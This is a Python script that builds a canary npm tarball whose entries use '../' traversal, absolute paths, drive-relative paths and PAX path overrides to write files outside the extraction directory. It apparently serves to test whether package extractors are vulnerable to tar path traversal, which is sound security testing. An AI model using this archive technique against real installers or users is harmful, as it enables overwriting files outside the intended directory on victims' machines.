import tarfile, io, json, time

OUT = "df-tarpath-canary-1.0.0.tgz"
PKG = "df-tarpath-canary"
NOW = int(time.time())

def add_dir(tar, name):
    info = tarfile.TarInfo(name.rstrip("/") + "/")
    info.type = tarfile.DIRTYPE
    info.mode = 0o755
    info.mtime = NOW
    tar.addfile(info)

def add_file(tar, name, data, mode=0o644, pax_path=None):
    b = data.encode()
    info = tarfile.TarInfo(name)
    info.type = tarfile.REGTYPE
    info.size = len(b)
    info.mode = mode
    info.mtime = NOW
    if pax_path:
        info.pax_headers = {"path": pax_path}
    tar.addfile(info, io.BytesIO(b))

pkg_json = {
    "name": PKG,
    "version": "1.0.0",
    "main": "index.js",
    "license": "MIT"
}

with tarfile.open(OUT, "w:gz", format=tarfile.PAX_FORMAT) as tar:
    add_dir(tar, "package")
    add_dir(tar, "package/a")
    add_dir(tar, "package/a/b")
    add_dir(tar, "package/a/b/c")
    add_dir(tar, "package/a/b/c/d")

    # normal package files
    add_file(tar, "package/package.json", json.dumps(pkg_json, indent=2) + "\n")
    add_file(tar, "package/index.js", "module.exports = 1;\n")
    add_file(tar, "package/normal.txt", "NORMAL_TARPATH_PACKAGE_FILE\n")

    # regular path traversal variants
    add_file(tar, "package/../../TARPATH_UP2_CANARY.txt", "TARPATH_UP2_CANARY\n")
    add_file(tar, "package/a/b/c/d/../../../../../TARPATH_NESTED_UP5_CANARY.txt", "TARPATH_NESTED_UP5_CANARY\n")
    add_file(tar, "package/a/b/c/d/../../../../../../TARPATH_NESTED_UP6_CANARY.txt", "TARPATH_NESTED_UP6_CANARY\n")

    # absolute and drive-ish variants
    add_file(tar, "/tmp/TARPATH_ABS_TMP_CANARY.txt", "TARPATH_ABS_TMP_CANARY\n")
    add_file(tar, "C:../../TARPATH_DRIVE_CANARY.txt", "TARPATH_DRIVE_CANARY\n")

    # PAX path override variants: safe header name, dangerous pax path
    add_file(
        tar,
        "package/safe_pax_up2",
        "TARPATH_PAX_UP2_CANARY\n",
        pax_path="package/../../TARPATH_PAX_UP2_CANARY.txt"
    )
    add_file(
        tar,
        "package/a/b/c/d/safe_pax_nested",
        "TARPATH_PAX_NESTED_CANARY\n",
        pax_path="package/a/b/c/d/../../../../../TARPATH_PAX_NESTED_CANARY.txt"
    )
    add_file(
        tar,
        "package/safe_pax_drive",
        "TARPATH_PAX_DRIVE_CANARY\n",
        pax_path="C:../../TARPATH_PAX_DRIVE_CANARY.txt"
    )

print(OUT)
